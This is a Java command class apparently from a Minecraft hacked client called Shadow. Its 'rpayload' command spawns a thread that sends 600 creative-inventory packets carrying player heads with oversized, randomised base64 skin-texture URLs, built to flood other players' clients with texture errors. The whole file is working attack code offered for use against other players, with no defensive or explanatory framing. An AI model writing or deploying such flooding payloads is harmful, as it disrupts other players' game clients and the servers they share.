package net.shadow.feature.command;

import net.minecraft.item.ItemStack;
import net.minecraft.item.Items;
import net.minecraft.nbt.NbtCompound;
import net.minecraft.nbt.NbtIntArray;
import net.minecraft.nbt.NbtList;
import net.minecraft.nbt.NbtString;
import net.minecraft.network.packet.c2s.play.CreativeInventoryActionC2SPacket;
import net.shadow.Shadow;
import net.shadow.feature.base.Command;
import java.util.List;
import net.shadow.utils.Utils;
import com.mojang.authlib.yggdrasil.YggdrasilMinecraftSessionService;
import java.util.ArrayList;
import java.util.Base64;
import java.util.List;
import java.util.Random;
import net.minecraft.item.SkullItem
;

public class ClientFloodCmd extends Command {
    public ClientFloodCmd() {
        super("rpayload", "makes the client print a ton of Texture payload errors");
    }

    @Override
    public List<String> completions(int index, String[] args){
        if(index == 0){
            return List.of(new String[]{"50"});
        }
        return List.of(new String[0]);
    }

    @Override
    public void call(String[] args) {
        //{SkullOwner:{Id:[I;1044599774,-91344643,-1626455549,-827872364],Name:'"MacBook Pro" ♦ made by courteously',Properties:{textures:[{Value:"eyJ0ZXh0dXJlcyI6eyJTS0lOIjp7InVybCI6Imh0dHBzOi8vZWR1Y2F0aW9uLm1pbmVjcmFmdC5uZXQvd3AtY29udGVudC91cGxvYWRzLzgzOTk1Ny1NQlAucG5nIn19fQ=="}]}}}
        new Thread(() -> {
            for (int i = 0; i < 600; i++) {
                ItemStack push = new ItemStack(Items.PLAYER_HEAD, 1);
                NbtCompound main = new NbtCompound();
                NbtCompound skullowner = new NbtCompound();
                List<Integer> ids = new ArrayList<>();
                ids.add(1044599774);
                ids.add(-91344643);
                ids.add(-1626455549);
                ids.add(-827872364);
                NbtIntArray id = new NbtIntArray(ids);
                skullowner.put("Id", id);
                skullowner.put("Name", NbtString.of("CFlood" + new Random().nextInt(50000)));
                NbtCompound b = new NbtCompound();
                NbtList d = new NbtList();
                NbtCompound c = new NbtCompound();
                String texture = "{\"textures\":{\"SKIN\":{\"url\":\"https://education.minecraft.net/wp-content/uploads/" + "OOPS".repeat(500) + "" + new Random().nextInt(5000000) + ".png\"}}}";
                String base = Base64.getEncoder().encodeToString(texture.getBytes());
                c.put("Value", NbtString.of(base));
                d.add(c);
                b.put("textures", d);
                skullowner.put("Properties", b);
                main.put("SkullOwner", skullowner);
                push.setNbt(main);
                Shadow.c.player.networkHandler.sendPacket(new CreativeInventoryActionC2SPacket(Shadow.c.player.getInventory().selectedSlot + 36, push));
                Utils.sleep(5);
            }
        }).start();
    }
}
